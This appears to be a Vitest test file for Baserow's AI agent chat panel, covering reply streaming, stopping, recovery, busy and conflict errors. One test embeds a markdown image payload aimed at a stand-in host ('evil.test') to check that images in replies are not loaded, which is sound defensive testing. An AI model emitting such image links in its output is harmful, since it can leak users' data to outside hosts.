import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest'
import { flushPromises } from '@vue/test-utils'
import service from '@baserow/modules/core/services/chatRuns'
import {
  composer,
  conversation,
  createAgentPage,
  deferredReply,
  destroyAgentPage,
  editInstructions,
  message,
  messages,
  mockConversations,
  mockMessages,
  mockSendMessage,
  mockStartConversation,
  openSection,
  page,
  runningReply,
  selectConversation,
  send,
  sendMessage,
  sentBodies,
  stop,
} from './helpers'

vi.mock('@baserow/modules/core/services/chatRuns', () => ({ default: vi.fn() }))

const existingConversation = conversation(
  'conversation-a',
  'Conversation A',
  undefined,
  7
)
const prompt = message('m1', 'Hello', { id: 1 })
const reply = (status, content = 'Hi there', extra = {}) =>
  message('reply-2', content, { id: 2, role: 'assistant', status, ...extra })
const error = (wrapper) => wrapper.find('.chat-message__bubble--error').text()
const note = (wrapper) => wrapper.find('.chat-message__note').text()
const strip = (wrapper) => wrapper.get('.chat-composer__status')
const announcement = (wrapper) =>
  wrapper.get('.agent-chat__announcement[role="status"]').text()
const liveReply = (wrapper) => wrapper.get('.chat-message__bubble[aria-live]')
const loadErrorAlert = (wrapper) =>
  wrapper
    .findAll('.alert')
    .find((alert) => alert.text().includes('agent.messagesLoadError'))

describe('Agent replies', () => {
  let testApp, mount, api, streams

  beforeEach(async () => {
    ;({ testApp, mount } = await createAgentPage())
    testApp.authenticate({ id: 1, first_name: 'Ada' })
    streams = {}
    api = {
      get: vi.fn().mockResolvedValue({ status: 'running' }),
      cancel: vi.fn().mockResolvedValue({ status: 'running' }),
      stream: vi.fn((runId, cursor, onRecord) => {
        streams[runId] = onRecord
        return new Promise(() => {})
      }),
    }
    service.mockReturnValue(api)
  })

  afterEach(async () => {
    await testApp.store.dispatch('chatRuns/disconnect')
    await destroyAgentPage(testApp)
  })

  async function receive(runId, kind, data, cursor = 'a:1-0') {
    await streams[runId]({ kind, data, cursor })
    await flushPromises()
  }
  const streamText = (runId, text) =>
    receive(runId, 'text.delta', { segment: 0, text })
  const finish = (runId, status = 'completed') =>
    receive(runId, 'run.finished', { status }, 'a:9-0')
  const withConversation = (...responses) => {
    mockConversations(testApp, page([existingConversation]))
    mockMessages(
      testApp,
      existingConversation.uuid,
      ...responses.map((items) =>
        typeof items === 'function' ? items : page(items)
      )
    )
  }
  const savedReply = (status = 'completed', content = 'Hi there') => [
    200,
    page([
      message(sentBodies(testApp)[0].message_uuid, 'Hello', { id: 1 }),
      reply(status, content),
    ]),
  ]

  async function startReply(refresh) {
    mockStartConversation(testApp, ({ data }) => {
      const body = JSON.parse(data)
      return [
        200,
        {
          conversation: conversation(body.uuid, body.content, undefined, 5),
          message: message(body.message_uuid, body.content, { id: 1 }),
          reply: runningReply(),
        },
      ]
    })
    testApp.mock
      .onGet(/\/agent\/10\/conversations\/.+\/messages\//)
      .reply(refresh)
    const wrapper = await mount()
    await sendMessage(wrapper, 'Hello')
    return wrapper
  }

  test('sends, streams and retains the reply until its persisted outcome loads', async () => {
    const pending = deferredReply()
    const wrapper = await startReply(pending.reply)

    expect(testApp.store.state.chatRuns.subscription).toEqual({
      runType: 'agent',
      chatId: 5,
    })
    expect(api.stream.mock.calls.map(([runId]) => runId)).toEqual(['run-1'])
    expect(messages(wrapper)).toEqual(['Hello'])
    expect(wrapper.get('.chat-message__author').text()).toBe(
      'Support agent agent.thinking'
    )
    expect(wrapper.get('.chat-message__avatar').text()).toBe('S')
    expect(strip(wrapper).text()).toBe('agent.thinking')
    expect(announcement(wrapper)).toBe('agent.replying')
    expect(stop(wrapper).attributes('aria-label')).toBe('agent.stop')

    await streamText('run-1', 'Hel')

    expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
    expect(liveReply(wrapper).attributes('aria-busy')).toBe('true')
    expect(wrapper.get('.chat-message__author').text()).toBe('Support agent')
    expect(strip(wrapper).text()).toBe('agent.writing')

    await finish('run-1')

    expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
    expect(liveReply(wrapper).attributes('aria-busy')).toBe('false')
    expect(strip(wrapper).classes()).not.toContain(
      'chat-composer__status--visible'
    )
    expect(send(wrapper).attributes('disabled')).toBeDefined()
    expect(testApp.mock.history.get.at(-1).headers).toMatchObject({
      'X-Baserow-Realtime-Recovery': 'true',
    })
    pending.resolve(...savedReply())
    await flushPromises()

    expect(messages(wrapper)).toEqual(['Hello', 'Hi there'])
    expect(announcement(wrapper)).toBe('')
    expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
  })

  test('loads the saved reply when its run ended before the send returned', async () => {
    api.get.mockResolvedValue({ status: 'completed', error_code: '' })
    const wrapper = await startReply(() => savedReply())

    expect(messages(wrapper)).toEqual(['Hello', 'Hi there'])
    expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
  })

  test('keeps Stop while the configuration stops being ready', async () => {
    const wrapper = await startReply(deferredReply().reply)

    await openSection(wrapper, 'agent.instructions')
    await editInstructions(wrapper, '')
    await stop(wrapper).trigger('click')
    await flushPromises()

    expect(api.cancel).toHaveBeenCalledExactlyOnceWith('run-1')
  })

  test('renders replies as markdown without loading images', async () => {
    withConversation([
      prompt,
      reply('completed', '- **First**\n- ![leak](https://evil.test/?q=1)'),
    ])
    const wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)

    const markdown = wrapper.get('.chat-markdown')
    expect(markdown.findAll('li').map((item) => item.text())).toEqual([
      'First',
      '!leak',
    ])
    expect(markdown.find('strong').text()).toBe('First')
    expect(markdown.find('img').exists()).toBe(false)
  })

  test('retains streamed text after a history failure and retries the saved outcome', async () => {
    testApp.dontFailOnErrorResponses()
    let available = false
    const wrapper = await startReply(() =>
      available ? savedReply() : [500, {}]
    )
    await streamText('run-1', 'Hel')

    await finish('run-1')

    expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
    available = true
    await loadErrorAlert(wrapper).get('button').trigger('click')
    await flushPromises()
    expect(messages(wrapper)).toEqual(['Hello', 'Hi there'])
    expect(loadErrorAlert(wrapper)).toBeUndefined()
  })

  test('stops a reply and shows its persisted cancellation', async () => {
    const wrapper = await startReply(() => savedReply('cancelled', 'Hel!'))
    await streamText('run-1', 'Hel')

    await stop(wrapper).trigger('click')
    await flushPromises()
    expect(api.cancel).toHaveBeenCalledExactlyOnceWith('run-1')
    expect(document.activeElement).toBe(composer(wrapper).element)
    await finish('run-1', 'cancelled')

    expect(messages(wrapper)).toEqual(['Hello', 'Hel!'])
    expect(note(wrapper)).toBe('agent.replyStopped')
    expect(announcement(wrapper)).toBe('agent.replyStopped')
  })

  test('follows an active reply on reload and recovers its saved outcome after logout', async () => {
    withConversation(
      [prompt, runningReply('run-2')],
      [prompt, reply('completed')]
    )
    let wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)
    await streamText('run-2', 'Partial')
    expect(messages(wrapper)).toEqual(['Hello', 'Partial'])

    await testApp.store.dispatch('chatRuns/disconnect')
    wrapper.unmount()
    api.get.mockResolvedValue({ status: 'completed', error_code: '' })
    wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)

    expect(messages(wrapper)).toEqual(['Hello', 'Hi there'])
    expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
  })

  test('queues a failed outcome behind the refresh started by another tab', async () => {
    const startedRefresh = deferredReply()
    const otherPrompt = message('m3', 'From another tab', { id: 3 })
    const otherReply = (status, content, extra) =>
      message('reply-4', content, {
        id: 4,
        role: 'assistant',
        status,
        ...extra,
      })
    withConversation([prompt, reply('completed')], startedRefresh.reply, [
      prompt,
      reply('completed'),
      otherPrompt,
      otherReply('failed', 'Partial', { errorCode: 'failed' }),
    ])
    const wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)
    await testApp.store.dispatch('chatRuns/handleChanged', {
      runId: 'run-4',
      runType: 'agent',
      chatId: existingConversation.id,
    })
    await flushPromises()
    await receive('run-4', 'run.started', {})
    await finish('run-4', 'failed')
    startedRefresh.resolve(
      200,
      page([
        prompt,
        reply('completed'),
        otherPrompt,
        otherReply('running', '', { runId: 'run-4' }),
      ])
    )
    await flushPromises()

    expect(messages(wrapper)).toEqual([
      'Hello',
      'Hi there',
      'From another tab',
      'Partial',
    ])
    expect(error(wrapper)).toBe('agent.replyFailed')
  })

  test('follows a conflicting reply while preserving the draft and clears its refusal in another chat', async () => {
    testApp.dontFailOnErrorResponses()
    const otherPrompt = message('m3', 'Other tab', { id: 3 })
    withConversation(
      [prompt],
      [prompt, otherPrompt, runningReply('run-3', 4)],
      [
        prompt,
        otherPrompt,
        message('reply-4', 'Hi there', {
          id: 4,
          role: 'assistant',
          status: 'completed',
        }),
      ]
    )
    mockConversations(
      testApp,
      page([
        existingConversation,
        conversation('conversation-b', 'Conversation B', undefined, 8),
      ])
    )
    mockMessages(testApp, 'conversation-b', page([]))
    mockSendMessage(testApp, existingConversation.uuid, [
      409,
      { error: 'ERROR_CHAT_RUN_IN_PROGRESS' },
    ])
    const wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)
    await sendMessage(wrapper, 'Again')

    expect(wrapper.get('#agent-chat-send-error').text()).toBe(
      'agent.replyInProgress'
    )
    expect(composer(wrapper).element.readOnly).toBe(false)
    expect(stop(wrapper).exists()).toBe(true)
    expect(api.stream.mock.calls.map(([runId]) => runId)).toEqual(['run-3'])
    await selectConversation(wrapper, 'Conversation B')
    expect(wrapper.find('#agent-chat-send-error').exists()).toBe(false)
    await finish('run-3')
    await selectConversation(wrapper, existingConversation.title)

    expect(messages(wrapper)).toEqual(['Hello', 'Other tab', 'Hi there'])
    expect(composer(wrapper).element.value).toBe('Again')
    expect(wrapper.find('#agent-chat-send-error').exists()).toBe(false)
    expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
  })

  test('keeps a busy refusal editable and allows retry with a new message ID', async () => {
    testApp.dontFailOnErrorResponses()
    withConversation([prompt])
    mockSendMessage(testApp, existingConversation.uuid, [
      429,
      { error: 'ERROR_AGENT_BUSY' },
    ])
    const wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)
    await sendMessage(wrapper, 'Again')

    expect(wrapper.get('#agent-chat-send-error').text()).toBe(
      'agent.agentsBusy'
    )
    expect(composer(wrapper).element.readOnly).toBe(false)
    await sendMessage(wrapper, 'Changed')
    const [first, second] = sentBodies(testApp)
    expect(second.uuid).not.toBe(first.uuid)
    expect(second.content).toBe('Changed')
  })

  test('clears a refusal if the other reply already ended before the refresh', async () => {
    testApp.dontFailOnErrorResponses()
    withConversation([prompt])
    mockSendMessage(testApp, existingConversation.uuid, [
      409,
      { error: 'ERROR_CHAT_RUN_IN_PROGRESS' },
    ])
    const wrapper = await mount()
    await selectConversation(wrapper, existingConversation.title)
    await sendMessage(wrapper, 'Again')

    expect(wrapper.find('#agent-chat-send-error').exists()).toBe(false)
    expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
  })

  test.each([
    [
      'failed',
      'timeout',
      'Partial',
      ['Hello', 'Partial'],
      'agent.replyTimedOut',
    ],
    ['running', '', '', ['Hello'], 'agent.replyInterrupted'],
  ])(
    'shows why a saved %s reply did not complete',
    async (status, errorCode, content, expectedMessages, expected) => {
      withConversation([prompt, reply(status, content, { errorCode })])
      const wrapper = await mount()
      await selectConversation(wrapper, existingConversation.title)

      expect(messages(wrapper)).toEqual(expectedMessages)
      expect(wrapper.findAll('.chat-message__bubble--error')).toHaveLength(1)
      expect(error(wrapper)).toBe(expected)
    }
  )
})
